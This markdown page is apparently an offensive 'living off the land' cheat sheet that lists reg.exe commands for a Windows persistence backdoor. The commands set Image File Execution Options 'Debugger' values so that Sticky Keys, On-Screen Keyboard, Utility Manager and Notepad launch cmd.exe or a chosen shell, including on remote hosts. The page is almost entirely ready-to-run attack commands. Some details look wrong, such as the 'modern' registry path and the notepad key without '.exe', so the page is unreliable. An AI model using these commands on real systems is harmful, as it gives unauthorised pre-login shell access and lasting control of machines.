# Living off the Land

TODO: Convert the commands to cmdlets

## Sticky Keys

- For legacy operating systems below Windows 7 and Windows 2008 R2

```
C:\> reg add "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
```

- For modern operating systems

```
C:\> reg add "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
```

## Accessibility On-Screen Keyboard

- For legacy operating systems below Windows 7 and Windows 2008 R2

```
C:\> reg add "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
```

- For modern operating systems

```
C:\> reg add "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
```

## Utility Manager

- For legacy operating systems below Windows 7 and Windows 2008 R2

```
C:\> reg add "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\Windows\system32\cmd.exe" /f
```

- For modern operating systems

```
C:\> reg add "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
```

## Notepad

- For legacy operating systems below Windows 7 and Windows 2008 R2

```
C:\> reg add "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad" /v Debugger /d "C:\path\to\shell.exe" /f
```

- For modern operating systems

```
C:\> reg add "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Image File Execution Options\notepad" /v Debugger /d "C:\path\to\shell.exe" /f
```

---
## References

- [LOFLCAB: reg](https://lofl-project.github.io/loflcab/Binaries/reg/)

- [RDP hijacking â€” how to hijack RDS and RemoteApp sessions transparently to move through an organisation](https://doublepulsar.com/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)